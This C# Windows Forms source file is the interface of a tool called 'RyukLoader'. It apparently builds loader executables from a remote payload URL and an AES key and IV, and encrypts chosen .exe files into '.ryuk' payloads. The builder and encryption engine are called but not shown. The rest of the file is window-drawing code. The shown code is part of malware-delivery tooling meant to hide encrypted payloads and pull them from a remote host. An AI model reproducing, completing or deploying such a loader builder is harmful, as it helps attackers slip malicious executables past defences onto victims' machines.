using RyukLoader.Internal.Builder;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace RyukLoader
{
    public partial class Form1 : Form
    {
        private int borderThickness = 2;
        private Color borderColor = Color.Cyan;

        public Form1()
        {
            InitializeComponent();
        }
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
        #region Builder Form

        private void BuilderBtn_Click(object sender, EventArgs e)
        {
            string
                RemoteUrl = FileURL_Box.Text,
                AesKey = AesBuilder_Box.Text,
                AesIV = AesBuilder_IV.Text;

            if (string.IsNullOrEmpty(RemoteUrl) || string.IsNullOrEmpty(AesKey))
            {
                MessageBox.Show("Forms cannot be empty!", "~ Build Information");
                return;
            }

            using (SaveFileDialog save =  new SaveFileDialog())
            {
                save.Title = "Save compiled file!";
                save.Filter = "Exe Files (*.exe)|*.exe";

                if (save.ShowDialog () == DialogResult.OK)
                {
                    Builder.Execute(save.FileName, RemoteUrl, AesKey, AesIV);
                    MessageBox.Show("Compiled successfull!", "~ Build Information ~", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        private void BReset_Btn_Click(object sender, EventArgs e)
        {
            FileURL_Box.Clear();
            AesBuilder_Box.Clear();
            AesBuilder_IV.Clear();

        }
        #endregion
        #region File Encryptor Form
        private void EncryptBtn_Click(object sender, EventArgs e)
        {
            string
                inputFile = FileToEncrypt_Box.Text,
                aesKey = AesFile_Box.Text,
                iv = VectorFile_Box.Text;

            if (string.IsNullOrEmpty(inputFile) || string.IsNullOrEmpty(aesKey) || string.IsNullOrEmpty(iv))
            {
                MessageBox.Show("Forms cannot be empty!", "~ Build Information");
                return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save compiled file!";
                save.Filter = "RyukLoader Files (*.ryuk)|*.ryuk";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    string outputFile = save.FileName;
                    try
                    {
                        // Шифруем файл
                        RyukLoader.Internal.EncryptEngine.EncryptEngine.EncryptFile(inputFile, outputFile, aesKey, iv);
                        MessageBox.Show("File encrypted successfully!", "Success");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error during encryption: {ex.Message}", "Error");
                    }
                }
            }
        }

        private void SelectToEncrypt_Btn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Open file to Encrypt";
                ofd.Filter = "Exe Files (*.exe)|*.exe";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    FileToEncrypt_Box.Text = ofd.FileName;
                }
            }
        }

        private void AesRandomization_Btn_Click(object sender, EventArgs e)
        {
            GenerateAesKey();
        }

        private void FReset_Btn_Click(object sender, EventArgs e)
        {
            FileToEncrypt_Box.Clear();
            AesFile_Box.Clear();
            VectorFile_Box.Clear();
        }

        private void GenerateAesKey()
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.Padding = PaddingMode.ISO10126;
                aes.GenerateIV();
                aes.GenerateKey();

                string key = Convert.ToBase64String(aes.Key);
                string iv = Convert.ToBase64String(aes.IV);

                VectorFile_Box.Text = iv;
                AesFile_Box.Text = key;
            }
        }

        #endregion
        #region Flat Form Design
        private void label1_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }
        private GraphicsPath CreateRoundedRectanglePath(int width, int height, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(0, 0, radius, radius, 180, 90);
            path.AddArc(width - radius, 0, radius, radius, 270, 90);
            path.AddArc(width - radius, height - radius, radius, radius, 0, 90);
            path.AddArc(0, height - radius, radius, radius, 90, 90);

            path.CloseFigure();

            return path;
        }


        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            using (Pen pen = new Pen(borderColor, borderThickness))
            {
                g.DrawPath(pen, CreateRoundedRectanglePath(this.ClientSize.Width, this.ClientSize.Height, 30));
            }
        }

        protected override void OnPaintBackground(PaintEventArgs e)
        {
            base.OnPaintBackground(e);

            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            using (SolidBrush brush = new SolidBrush(this.BackColor))
            {
                g.FillPath(brush, CreateRoundedRectanglePath(this.ClientSize.Width, this.ClientSize.Height, 30));
            }
        }

        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);
            this.Invalidate();
        }

        protected override void OnMouseDown(MouseEventArgs e)
        {
            base.OnMouseDown(e);

            if (e.Button == MouseButtons.Left)
            {
                this.Capture = false;
                Message m = Message.Create(this.Handle, 0xA1, new IntPtr(2), IntPtr.Zero);
                this.WndProc(ref m);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Padding = new Padding(borderThickness);
            int CornerRadius = 30;
            GraphicsPath path = CreateRoundedRectanglePath(this.Width, this.Height, CornerRadius);
            this.Region = new Region(path);
        }
        #endregion
    }
}
